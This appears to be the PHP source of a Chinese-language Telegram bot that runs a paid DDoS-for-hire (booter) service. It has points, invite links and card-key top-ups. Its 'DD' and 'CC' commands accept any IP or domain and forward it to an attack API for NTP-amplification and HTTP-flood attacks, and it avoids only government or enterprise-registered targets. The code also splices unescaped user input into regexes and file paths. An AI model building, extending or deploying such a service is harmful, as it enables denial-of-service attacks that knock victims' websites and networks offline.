<?php
require('./cURL.php');
use OpensApi\utils\cURL;

/* chat 来源 , from 触发人 */
//Bot Key
$key = "Bot的key";
//设置链接根
$url = "https://api.telegram.org/bot" . $key . "/";
//说话接口 参数:text chat_id
$say = $url . "sendMessage";
//发图接口 参数photo chat_id
$photo = $url . "sendPhoto";
//语音接口 参数voice chat_id
$voice = $url . "sendVoice";
//视频接口 参数video chat_id
$video = $url . "sendVideo";
//文件接口 参数document chat_id
$document = $url . "sendDocument";
//骰子接口 参数emoji chat_id
$dice = $url . "sendDice";
//贴图接口 参数
$sticker = $url . "Sticker";
//键盘按钮接口 参数text chat_id
$keyboardbutton = $url . "KeyboardButton";
//修改文字接口 参数text chat_id message_id
$editMessageText = $url . "editMessageText";
//媒体组接口 参数media chat_id
//lnputMedia 音频|文件|图片|视频
$sendGroup = $url . "sendMediaGroup";
//删除消息接口 参数chat_id message_id
$say_delete = $url . "deleteMessage";
//获取文件 参数file_id
$getFile = $url . "getFile";
//获取反射信息
$update = json_decode(file_get_contents('php://input'), true);
//获取反射信息2
//$update2 = json_decode(json_encode(json_decode(file_get_contents('php://input'),true), 320 | 460), true);
//总消息ID
$update_id = $update['update_id'];
//本群聊或私聊 消息ID
$message_id = $update['message']['message_id'];
//本群聊或私聊 消息ID2
$message_id2 = $update['callback_query']['message']['message_id'];
//用户ID
$chat_id = $update['message']['chat']['id'];
//用户id2
$chat_id2 = $update['callback_query']['message']['chat']["id"];
//用户ID
$from_id = $update['message']['from']['id'];
//获取回复用户id
$from_idpro = $update['message']['reply_to_message']['from']['id'];
//用户名 @xxxx (群聊下chat没有user)
$chat_user = $update['message']['chat']['username'];
//用户名 @xxxx
$from_user = $update['message']['from']['username'];
//消息类型 私人或群聊 等
$chat_type = $update['message']['chat']['type'];
//群名称 群聊状态下有效
$chat_title = $update['message']['chat']['title'];
//进群信息
$new_chat_participant = $update['message']['new_chat_participant'];
//退群信息
$left_chat_participant = $update['message']['left_chat_participant'];
//贴图id
$file_id = $update['message']["sticker"]['file_id'];
//判断是否为bot 否返回false 是返回true
$from_bot = $update['message']['from']['bot'];
//用户语言
$from_code = $update['message']['from']['language_code'];
//用户名 比如:清x
$chat_name = $update['message']['chat']['first_name'];
//用户姓 比如:x尘
$chat_name2 = $update['message']['chat']['last_name'];
//用户名 比如:莹x
$from_name = $update['message']['from']['first_name'];
//用户姓 比如:x子
$from_name2 = $update['message']['from']['last_name'];
//消息内容
$msg = $update['message']['text'];
//消息日期
$msg_date = $update['message']['date'];
//数据路径
$integration = "./data/user/";
//数据路径2
$integration2 = "./data/money/";
//卡密路径
$key_file = "./data/key";
//页数路径
$btns = "./data/btns";
$book_path = './data/book';
//当前host
$host = "http://{$_SERVER['HTTP_HOST']}";

//不介绍的
//"entities":[{"offset":0,"length":5,"type":"bot_command"}]暂不做介绍

//$text = json_encode(json_decode(file_get_contents('php://input'),true), 320 | 460);
//say_text($say,urlencode($text.dirname(__FILE__)."/1"),$chat_id);

//file_put_contents('a.json', file_get_contents('php://input'));

if ($chat_user != "你的群ID下面的链接也记得换" & preg_match("/" . $msg . "/", file_get_contents("./bot.php"))) {
    $file_data = file_get_contents("./data/repeat");
    if (!preg_match("/" . $from_id . "/", $file_data)) {
        $text = "请在主群签到后使用！\n加入主群：https://t.me/yaya_ddos";
        say_text($say,urlencode($text),$chat_id);
        return;
    }
}

//发送给用户
if($msg == "测试") {
$text = json_encode(json_decode(file_get_contents('php://input'),true), 320 | 460);
$fp = fopen(dirname(__FILE__)."/1", "w");
$flag = fwrite($fp,$text);
fclose($fp);
say_text($say,urlencode($text.dirname(__FILE__)."/1"),$chat_id);
say_document($document, urlencode("https://css4sb.icu/proxy.php") ,$chat_id ,"123");
}
//进群提示
else if ($new_chat_participant['id']) {
    if ($from_id != $new_chat_participant['id']) {
        $text = "邀请人信息\n用户名：" . $from_name . " " . $from_name2 . "\n用户ID：" . $from_id;
        $text2 = "受邀人信息\n用户名：" . $new_chat_participant['first_name'] . " " . $new_chat_participant['last_name'] . "\n用户ID：" . $new_chat_participant['id'] . "\n状态：有人邀请老板进群了";
        say_text($say,urlencode($text . "\n\n" . $text2),$chat_id);
        //邀请人加积分
        /*$integration = $integration . "" . $from_id;
        $file_txt = file_get_contents($integration);
        $give = 60;
        $num = $file_txt + $give;
        xx($integration, $num);
        $text = "邀请人加积分！\nUID: {$from_id}\n积分数: {$give}积分";
        say_text($say,urlencode($text),$chat_id);*/
    } else {
        $text = "用户名：" . $new_chat_participant['first_name'] . " " . $new_chat_participant['last_name'] . "\n用户ID：" . $new_chat_participant['id'] . "\n状态：这位老板进群了";
        say_text($say,urlencode($text),$chat_id);
    }
}
//退群提示
else if ($left_chat_participant['id']) {
    $text = "用户名：" . $left_chat_participant['first_name'] . " " . $left_chat_participant['last_name'] . "\n用户ID：" . $left_chat_participant['id'] . "\n状态：这位老板退群了";
    say_text($say,urlencode($text),$chat_id);
} 
//开启自定义键盘
else if ($msg == "/start") {
    //$getUrl = $url . "sendmessage?reply_to_message_id=" . $reply_to_message_id . "&text=" . $msg . "&chat_id=" . $chat_id . "&reply_markup=" . $reply_markup;
    $text = "鸭鸭bot，好用的bot！";
    $json["keyboard"][0][0]["text"] = "菜单";
    $json["keyboard"][0][0]["resize_keyboard"] = false;
    $json["keyboard"][0][1]["text"] = "签到";
    $json["keyboard"][0][1]["resize_keyboard"] = false;
    $json["keyboard"][1][0]["text"] = "关于";
    $json["keyboard"][1][0]["resize_keyboard"] = false;
    $json["keyboard"][1][1]["text"] = "我的积分";
    $json["keyboard"][1][1]["resize_keyboard"] = false;
    $json["keyboard"][2][0]["text"] = "创建邀请";
    $json["keyboard"][2][0]["resize_keyboard"] = false;
    $json["keyboard"][2][1]["text"] = "我要定制";
    $json["keyboard"][2][1]["resize_keyboard"] = false;
    $reply_markup = json_encode($json, JSON_UNESCAPED_UNICODE);
    //file_get_contents($say . "?text=" . $text . "&reply_to_message_id=" . $message_id . "&reply_markup=" . $reply_markup . "&chat_id=" . $chat_id);
    say_text2($say,urlencode($text),$chat_id,$message_id,$reply_markup);
}
//邀请系统
else if($msg == "创建邀请链" | $msg == "创建邀请") {
    $data = "./data/invite/" . $from_id;
    $file_data = file_get_contents($data);
    if ($file_data) {
        $text = "您已经创建过了\n这是您的邀请链：https://t.me/Yayaoh_Bot?start=" . $file_data;
        say_text($say,urlencode($text),$chat_id);
    } else {
        $rand = mt_rand(10000, 99999);
        xx($data, $rand);
        xx("./data/invite/" . $rand, $from_id);
        $text = "创建成功了哦！\n这是您的邀请链：https://t.me/Yayaoh_Bot?start=" . $rand;
        say_text($say,urlencode($text),$chat_id);
    }
}
//验证邀请码
else if(preg_match("/^\/start ?(.*)\$/",$msg,$return)) {
    $data = "./data/invite/" . $return[1];
    $file_data = file_get_contents($data);
    $file_data2 = file_get_contents($data . "repeat");
    if ($from_id == $file_data | preg_match("/" . $from_id . "/",$file_data2)) {
        $text = "亲，想白嫖想疯了吧？？？";
        say_text($say,urlencode($text),$chat_id);
    }else if (!$file_data) {
        $text = "错误的邀请链，请重新获取正确的链接吧！";
        say_text($say,urlencode($text),$chat_id);
    } else {
        $text = "欢迎使用鸭鸭测压bot，一个好用的bot！\n发送 菜单 开始使用它吧！！！";
        say_text($say,urlencode($text),$chat_id);
        file_put_contents($data . "repeat", $from_id . "\n", FILE_APPEND);
        //增加积分
        $integration = $integration . "" . $file_data;
        $file_txt = file_get_contents($integration);
        $give = 60;
        $num = $file_txt + $give;
        xx($integration, $num);
        $text = "邀请人加积分！\nUID: {$from_id}\n积分数: {$give}积分";
        say_text($say,urlencode($text),$file_data);
    }
    
}
//发送图片
else if(preg_match("/^测试图片 ?(.*)\$/",$msg,$return)) {
    say_text($say,"收到收到，over~",$chat_id);
    say_img($photo,urlencode($return[1]),$chat_id,$return[1]);
}
//发送文件
else if(preg_match("/^测试文件 ?(.*)\$/",$msg,$return)) {
    say_text($say,"收到收到，over~",$chat_id);
    say_document($document,urlencode($return[1]),$chat_id,$return[1]);
}
//发送音频
else if(preg_match("/^测试音频 ?(.*)\$/",$msg,$return)) {
    say_text($say,"收到收到，over~",$chat_id);
    say_voice($voice,urlencode($return[1]),$chat_id);
}
//加积分
else if(preg_match("/^加积分 ([0-9]+)\$/",$msg,$return)) {
     $integration = $integration . "" . $from_idpro;
     $file_txt = file_get_contents($integration);
     if($from_id == 你的UID|$from_id == 你的UID) {
     $num = $file_txt + $return[1];
     xx($integration, $num);
     $text = "添加积分成功了哦！\nUID: {$from_idpro}\n积分数: {$return[1]}积分";
     say_text($say,urlencode($text),$chat_id);
     } else {
     $text = "再乱玩我会生气哦~";
     say_text($say,urlencode($text),$chat_id);
     }
}
//减积分
else if(preg_match("/^减积分 ([0-9]+)\$/",$msg,$return)) {
     $integration = $integration . "" . $from_idpro;
     $file_txt = file_get_contents($integration);
     if($from_id == 你的UID|$from_id == 你的UID) {
     $num = $file_txt - $return[1];
     xx($integration, $num);
     $text = "减少积分了呦！\nUID: {$from_idpro}\n积分数: {$return[1]}积分";
     say_text($say,urlencode($text),$chat_id);
     } else {
     $text = "再乱玩我会生气哦~";
     say_text($say,urlencode($text),$chat_id);
     }
}
//卡密系统
else if(preg_match("/^使用卡密 ?([0-9a-z]+)*\$/",$msg,$return)) {
    //say_text($say,urlencode($return[1]),$chat_id);
    $num = 360;
    $key = file_get_contents($key_file);
    $integration = $integration . "" . $from_id;
    $file_txt = file_get_contents($integration);
    if ($return[1] == null) { say_text($say,urlencode("请输入卡密"),$chat_id); return; }
    if(!preg_match("/" . $return[1] . "-/",$key)) { say_text($say,urlencode("卡密失效/不存在"),$chat_id); return; }
    $key_data = str_replace($return[1]."-", null, $key);
    xx($key_file, $key_data);
    file_put_contents($key_file."_data","\n卡密：{$return[1]}|使用者：{$from_id}", FILE_APPEND);
    $file_data = $file_txt + $num;
    xx($integration, $file_data);
    $text = "使用卡密成功！\nUID: {$from_id}\n积分数: {$num}积分";
    say_text($say,urlencode($text),$chat_id);
}
else if($msg == "生成卡密") {
    if($from_id == 你的UID|$from_id == 你的UID) {
        $key = mt_rand(10000000000,999999999999);
        $key = md5("qc:" . $key);
        file_put_contents($key_file,$key."-", FILE_APPEND);
        $text = "生成成功！\n卡密：{$key}\n感谢使用。";
        say_text($say,urlencode($text),$from_id);
        $text = "生成成功！\n卡密：查看私聊\n感谢使用。";
        say_text($say,urlencode($text),$chat_id);
    } else {
        $text = "再乱玩我会生气哦~";
        say_text($say,urlencode($text),$chat_id);
    }
}
else if(preg_match("/^查询卡密状态 ?(.*)\$/",$msg,$return)) {
    $key = file_get_contents($key_file);
    if ($return[1] == null) { say_text($say,urlencode("请输入卡密"),$chat_id); return; }
    if(!preg_match("/" . $return[1] . "-/",$key)) {
        say_text($say,urlencode("卡密失效/不存在"),$chat_id);
        return;
    } else {
        say_text($say,urlencode("卡密状态正常"),$chat_id);
    }
}
else if($msg == "查看使用卡密") {
    if($from_id == 你的UID|$from_id == 你的UID) {
    $text = file_get_contents($key_file."_data");
    say_text($say,urlencode($text),$chat_id);
    } else {
        $text = "再乱玩我会生气哦~";
        say_text($say,urlencode($text),$chat_id);
    }
}
else if($msg == "查看库存卡密") {
    if($from_id == 你的UID|$from_id == 你的UID) {
    $text = file_get_contents($key_file) . "以上为未使用卡密！";
    say_text($say,urlencode(str_replace("-", "\n", $text)),$chat_id);
    } else {
        $text = "再乱玩我会生气哦~";
        say_text($say,urlencode($text),$chat_id);
    }
}
else if($msg == "随机输出库存卡密") {
    if($from_id == 你的UID|$from_id == 你的UID|$from_id == 你的UID) {
    $key = file_get_contents($key_file);
    if(!$key) { say_text($say,urlencode("无库存卡密，请先生成！"),$chat_id); return; }
    $key_array = explode("-",$key);
    $rand = mt_rand(0,(count($key_array) - 1));
    $text = $key_array[$rand];
    say_text($say,urlencode($text),$chat_id);
    } else {
        $text = "再乱玩我会生气哦~";
        say_text($say,urlencode($text),$chat_id);
    }
}
//我的积分
else if($msg == "我的积分") {
$num = file_get_contents($integration."".$from_id);
if(!$num) { $num = 0; }
$text = "查询成功！\nUID: {$from_id}\n老板您有: ".$num."积分";
say_text($say,urlencode($text),$chat_id);
}
//查询积分
else if($msg == "查询积分") {
    if (!$from_idpro) {
        $num = file_get_contents($integration."".$from_id);
        if(!$num) { $num = 0; }
        $text = "查询成功！\nUID: {$from_id}\n这位老板有: ".$num."积分";
        say_text($say,urlencode($text),$chat_id);
    } else {
        $num = file_get_contents($integration."".$from_idpro);
        if(!$num) { $num = 0; }
        $text = "查询成功！\nUID: {$from_idpro}\n这位老板有: ".$num."积分";
        say_text($say,urlencode($text),$chat_id);
    }
}
//查询积分
else if(preg_match("/^查询积分 (.*)\$/",$msg,$return)) {
$num = file_get_contents($integration."".$return[1]);
if(!$num) { $num = 0; }
$text = "查询成功！\nUID: {$return[1]}\n这位老板有: ".$num."积分";
say_text($say,urlencode($text),$chat_id);
}
//撤回
else if(preg_match("/gov|GOV|清尘量/",$msg)) {
    say_text($say,urlencode("别想了啦，这可碰不得！"),$chat_id);
    sleep(1);
    say_delete($say_delete,$chat_id,$message_id);
}
//提交攻击UDP
else if(preg_match("/^DD ([0-9]+).([0-9]+).([0-9]+).([0-9]+):([0-9]+) ([0-9]+)\$/",$msg,$return)) {
     $integration = $integration . "" . $from_id;
     $file_txt = file_get_contents($integration);
     $num = file_get_contents($integration);
     $date = time();
     $date2 = file_get_contents("./data/Team");
     $IP = "{$return[1]}.{$return[2]}.{$return[3]}.{$return[4]}";
     $cx_api = "http://".$_SERVER['HTTP_HOST']."/qc/cxym.php";
     $icp = file_get_contents($cx_api . "?ip=" . $IP);
     if(!$num) { $num = 0; }
     if($date < $date2) { say_text($say,"请在等".($date2 - $date)."s后提交吧！",$chat_id); return; }
     if($num<$return[6]) { say_text($say,"您的积分不足哦，快来充值吧！",$chat_id); return; }
     if(preg_match("/企业/",$icp)) { say_text($say,"是{$icp}备案那我们就别碰了吧！",$chat_id); return; }
     if($return[6]>120 | $return[6]<60) { say_text($say,"最大|小限制为120|60s/次",$chat_id); return; }
     $Port = $return[5];
     $Time = $return[6];
     $text = "提交成功！\n{$IP}:$Port time:{$Time} method:ntp";
     $num = $file_txt - $return[6];
     xx($integration, $num);
     xx("./data/Team", ($date + $Time + 10));
     say_text($say,"请稍等...",$chat_id);
     say_text($say,urlencode($text),$chat_id);
     say_text($say,"已扣除所需({$Time})积分",$chat_id);
     //提交格式 里面填api
     file_get_contents("api.php?key=qc5201314&host={$IP}&port={$Port}&time={$Time}&method=ntp");
     return;
}
//提交攻击Http
else if(preg_match("/^CC (.*):([0-9]+) ([0-9]+)\$/",$msg,$return)) {
     $integration = $integration . "" . $from_id;
     $file_txt = file_get_contents($integration);
     $num = file_get_contents($integration);
     $date = time();
     $date2 = file_get_contents("./data/Team");
     $host = $return[1];
     $cx_api = "http://".$_SERVER['HTTP_HOST']."/cxym2.php";
     $icp = file_get_contents($cx_api . "?ym=" . $host);
     if(!$num) { $num = 0; }
     if($date < $date2) { say_text($say,"请在等".($date2 - $date)."s后提交吧！",$chat_id); return; }
     if($num<$return[3]) { say_text($say,"您的积分不足哦，快来充值吧！",$chat_id); return; }
     if(!preg_match("/http|https/",$host)) { say_text($say,"请携带访问头！",$chat_id); return; }
     if(preg_match("/企业/",$icp) & $from_id != 你的UID & $from_id != 你的UID) { say_text($say,"是{$icp}备案那我们就别碰了吧！",$chat_id); return; }
     if($return[3]>120 | $return[3]<60) { say_text($say,"最大|小限制为120|60s/次",$chat_id); return; }
     $Port = $return[2];
     $Time = $return[3];
     $text = "提交成功！\n{$host}:$Port time:{$Time} method:cc";
     $num = $file_txt - $return[3];
     xx($integration, $num);
     xx("./data/Team", ($date + $Time + 10));
     say_text($say,"请稍等...",$chat_id);
     say_text($say,urlencode($text),$chat_id);
     say_text($say,"已扣除所需({$Time})积分",$chat_id);
     //提交格式 里面填api
     file_get_contents("api.php?key=qc5201314&host={$host}&port={$Port}&time={$Time}&method=cc");
     return;
}
//更新列表
else if($msg == "更新列表") {
    if($from_id == 你的UID|$from_id == 你的UID) {
        say_text($say,"请稍等...",$chat_id);
        file_get_contents("api.php?key=qc5201314&host=1.1.1.1&port=80&time=60&method=proxy");
        say_text($say,"更新成功！",$chat_id);
        return;
    } else {
        $text = "再乱玩我会生气哦~";
        say_text($say,urlencode($text),$chat_id);
    }
}
//签到
else if($msg == "签到") {
     $from_data = $integration . "time/" . $from_id;
     $from_time = file_get_contents($from_data);
     $integration = $integration . "" . $from_id;
     $file_txt = file_get_contents($integration);
     $time = date("Ymd"); $number = rand(60,120);//积分
     if($from_time == $time) { say_text($say,"你已经签到过啦，明天再来吧！",$chat_id); return; }
     $num = $file_txt + $number;
     xx($integration, $num);
     xx($from_data, $time);
     file_put_contents("./data/repeat", $from_id . "\n", FILE_APPEND);
     $text = "签到成功！\nUID: {$from_id}\n积分数: {$number}积分";
     say_text($say,urlencode($text),$chat_id);
}
//菜单
else if ($msg == "菜单") {
    $json["inline_keyboard"][0][0]["text"] = "下页";
    $json["inline_keyboard"][0][0]["callback_data"] = 2;
    $reply_markup = json_encode($json, JSON_UNESCAPED_UNICODE);
    xx($btns,1);
    $text = "签到获取积分！\n发送格式查看使用方法。\nTips:发送【创建邀请链】邀请人可以获得积分哦！";// \n是换行
    say_text2($say,urlencode($text),$chat_id,$message_id,$reply_markup);
}
//按钮响应
else if ($update['callback_query']["data"] == 1) {
    $json["inline_keyboard"][0][0]["text"] = "下页";
    $json["inline_keyboard"][0][0]["callback_data"] = 2;
    $reply_markup = json_encode($json, JSON_UNESCAPED_UNICODE);
    xx($btns,1);
    $text = "签到获取积分！\n发送格式查看使用方法。\nTips:发送【创建邀请链】邀请人可以获得积分哦！";// \n是换行
    say_edit($editMessageText,urlencode($text),$chat_id2,$message_id2,$reply_markup);
}
//按钮响应2
else if ($update['callback_query']["data"] == 2) {
    $btns_num = file_get_contents($btns);
    $btns_new = $btns_num + 1;
    $json["inline_keyboard"][0][0]["text"] = "上页";
    $json["inline_keyboard"][0][0]["callback_data"] = 1;
    $json["inline_keyboard"][0][1]["text"] = "下页";
    $json["inline_keyboard"][0][1]["callback_data"] = 2;
    $reply_markup = json_encode($json, JSON_UNESCAPED_UNICODE);
    if ($btns_new == 2) {
        xx($btns, $btns_new);
        $text = "DD IP:端口 时间（ntp）\nCC 域名:端口 时间（cc）";// \n是换行
        say_edit($editMessageText,urlencode($text),$chat_id2,$message_id2,$reply_markup);
    }
    else if ($btns_new == 3) {
        xx($btns, $btns_new);
        $key = file_get_contents($key_file);
        $key_array = explode("-",$key);
        $text = "使用|生成卡密\n查询卡密状态\n查看使用卡密\n查看库存卡密\n随机输出库存卡密\n剩余卡密数量：" . (count($key_array) - 1) . "张";
        say_edit($editMessageText,urlencode($text),$chat_id2,$message_id2,$reply_markup);
    }
    else if ($btns_new == 4) {
        xx($btns, $btns_new);
        $text = "更新日志\n1.0.6新增更新日志\n1.0.5去除列表功能\n1.0.4优化备案系统\n1.0.3优化卡密系统\n1.0.2修复诺干bug\n1.0.1更新卡密系统";// \n是换行
        say_edit($editMessageText,urlencode($text),$chat_id2,$message_id2,$reply_markup);
    }
    else {
        say_edit($editMessageText,urlencode("暂无内容！"),$chat_id2,$message_id2,$reply_markup);
    }
}
//关于
else if($msg == "关于") {
$text = "这是一个好用bot！";// \n是换行
say_text($say,urlencode($text),$chat_id);
}
//ping
else if(preg_match("/^ping ?(.*)\$/",$msg,$return)) {
$ping_api = "http://".$_SERVER['HTTP_HOST']."/ping.php";
$text = file_get_contents($ping_api . "?msg=" . $return[1]);
say_text($say,urlencode($text),$chat_id);
}
//ip反查备案
else if(preg_match("/^查询备案 ?(.*)\$/",$msg,$return)) {
    $cx_api = "http://".$_SERVER['HTTP_HOST']."/cxym.php";
    $text = file_get_contents($cx_api . "?ip=" . $return[1]);
    say_text($say,urlencode($text),$chat_id);
}
//域名查询备案
else if(preg_match("/^备案查询 ?(.*)\$/",$msg,$return)) {
    $cx_api = "http://".$_SERVER['HTTP_HOST']."/cxym2.php";
    $text = file_get_contents($cx_api . "?ym=" . $return[1]);
    say_text($say,urlencode($text),$chat_id);
}
//get访问
else if(preg_match("/^get ?(.*)\$/",$msg,$return)) {
    if($from_id == 你的UID|$from_id == 你的UID) {
        say_text($say,"请稍等...",$chat_id);
        say_text($say,urlencode(get_result($return[1])),$chat_id);
        return;
    } else {
        $text = "再乱玩我会生气哦~";
        say_text($say,urlencode($text),$chat_id);
    }
}
//广告
else if($msg == "我要定制") {
    say_text($say,urlencode("需要机器人搭建请联系 @qingchenyun 功能均可定制，价格漂亮！"),$chat_id);
}

//微妙
function microtime_float(){
list($usec, $sec) = explode(" ", microtime());
return ((float)$usec + (float)$sec);
}

//定义函数 说话(更方便)
function say_text($say,$text,$chat_id) {
    return curl($say . "?text=" . $text . "&chat_id=" . $chat_id);
}

//定义函数 说话2(更方便)
function say_text2($say,$text,$chat_id,$message_id,$reply_markup) {
    return curl($say, "text=" . $text . "&reply_to_message_id=" . $message_id . "&reply_markup=" . $reply_markup . "&chat_id=" . $chat_id);
}

//定义函数 发图(更方便)
function say_img($photo,$img,$chat_id,$caption) {
    return curl($photo . "?chat_id=" . $chat_id . "&photo=" . $img . "&caption=" . $caption);
}

//定义函数 发语音(更方便)
function say_voice($voice,$mp3,$chat_id) {
    return curl($voice . "?chat_id=" . $chat_id . "&voice=" . $mp3);
}

//定义函数 发视频(更方便)
function say_video($video,$mp4,$chat_id) {
    return curl($video . "?chat_id=" . $chat_id . "&video=" . $mp4);
}

//定义函数 发文件(更方便)
function say_document($document,$file,$chat_id,$caption) {
    return curl($document . "?chat_id=" . $chat_id . "&document=" . $file . "&caption=" . $caption);
}

//定义函数 骰子(更方便)
function say_dice($dice,$emoji,$chat_id) {
    return curl($dice . "?chat_id=" . $chat_id . "&emoji=" . $emoji);
}

//定义函数 删除消息(更方便)
function say_delete($say_delete,$chat_id,$message_id) {
    return curl($say_delete . "?chat_id=" . $chat_id . "&message_id=" . $message_id);
}

//定义函数 修改消息(更方便)
function say_edit($editMessageText,$text,$chat_id,$message_id,$reply_markup) {
    return curl($editMessageText, "text=" . $text  . "&chat_id=" . $chat_id . "&message_id=" . $message_id . "&reply_markup=" . $reply_markup);
}

//定义函数 写入(更方便)
function xx($file, $data) {
$fp = fopen($file, "w");
$flag = fwrite($fp,$data);
fclose($fp);
}

//定义函数 取中间(更方便)
function GetBetween($content,$start,$end){
$r = explode($start, $content);
if (isset($r[1])){
$r = explode($end, $r[1]);
return $r[0];
}
return '';
}

//定义函数 分割字符|文字(更方便)
/*function mb_str_split($str,$split_length=1,$charset="UTF-8") {
  if(func_num_args()==1){
    return preg_split('/(?<!^)(?!$)/u', $str);
  }
  if($split_length<1)return false;
  $len = mb_strlen($str, $charset);
  $arr = array();
  for($i=0;$i<$len;$i+=$split_length){
    $s = mb_substr($str, $i, $split_length, $charset);
    $arr[] = $s;
  }
  return $arr;
}*/

//定义函数 Post提交的数据包(更方便)
function Http_post($url,$data) {
	$curl = curl_init(); // 启动一个CURL会话
    curl_setopt($curl, CURLOPT_URL, $url); // 要访问的地址
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); // 对认证证书来源的检查
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1); // 从证书中检查SSL加密算法是否存在
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); // 模拟用户使用的浏览器
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); // 使用自动跳转
    curl_setopt($curl, CURLOPT_AUTOREFERER, 1); // 自动设置Referer
    curl_setopt($curl, CURLOPT_POST, 1); // 发送一个常规的Post请求
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data); // Post提交的数据包
    curl_setopt($curl, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
    curl_setopt($curl, CURLOPT_HEADER, 0); // 显示返回的Header区域内容
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); // 获取的信息以文件流的形式返回
    $tmpInfo = curl_exec($curl); // 执行操作
    if (curl_errno($curl)) {
        echo 'Errno'.curl_error($curl);//捕抓异常
    }
    curl_close($curl); // 关闭CURL会话
    return $tmpInfo;
}

//定义函数 高级访问(更方便)
function curl($url,$data=0,$header_array=0,$referer=0,$time=30,$code=0) {
	if($header_array==0) {
		$header=array("CLIENT-IP: ".getip_user(),"X-FORWARDED-FOR: ".getip_user(),'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36');
	} else {
		$header=array("CLIENT-IP: ".getip_user(),"X-FORWARDED-FOR: ".getip_user());
		$header=array_merge($header_array,$header);
	}
	//print_r($header);
	$curl=curl_init();
	curl_setopt($curl,CURLOPT_URL,$url);
	curl_setopt($curl,CURLOPT_HTTPHEADER,$header);
	if($data) {
		curl_setopt($curl,CURLOPT_POST,1);
		curl_setopt($curl,CURLOPT_POSTFIELDS,$data);
	}
	if($referer) {
		curl_setopt($curl,CURLOPT_REFERER,$referer);
	}
	curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
	//设置等待时间
	curl_setopt($curl,CURLOPT_TIMEOUT,$time);
	curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
	curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($curl,CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($curl,CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($curl,CURLOPT_ENCODING,'gzip,deflate');
	if($code) {
		curl_setopt($curl, CURLOPT_HEADER, 1);
		$return=curl_exec($curl);
		$code_code=curl_getinfo($curl);
		curl_close($curl);
		$code_int['exec']=substr($return,$code_code["header_size"]);
		$code_int['code']=$code_code["http_code"];
		$code_int['content_type']=$code_code["content_type"];
		$code_int['header']=substr($return,0,$code_code["header_size"]);
		return $code_int;
	} else {
		$return=curl_exec($curl);
		curl_close($curl);
		return $return;
	}
}

//定义函数 高级访问附件(更方便)
function getip_user() {
	if(empty($_SERVER["HTTP_CLIENT_IP"]) == false) {
		$cip = $_SERVER["HTTP_CLIENT_IP"];
	} else if(empty($_SERVER["HTTP_X_FORWARDED_FOR"]) == false) {
		$cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
	} else if(empty($_SERVER["REMOTE_ADDR"]) == false) {
		$cip = $_SERVER["REMOTE_ADDR"];
	} else {
		$cip = "";
	}
	preg_match("/[\d\.]{7,15}/", $cip, $cips);
	$cip = isset($cips[0]) ? $cips[0] : "";
	unset($cips);
	return $cip;
}

//定义函数 高级get(更方便)
function get_result($url,$cookie) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
$header = array();
//curl_setopt($ch,CURLOPT_POST,true);
//curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3); //设置等待时间
curl_setopt($ch, CURLOPT_TIMEOUT, 30); //设置cURL允许执行的最长秒数
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_HEADER, 0); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$content = curl_exec($ch);
curl_close($ch);
return $content;
}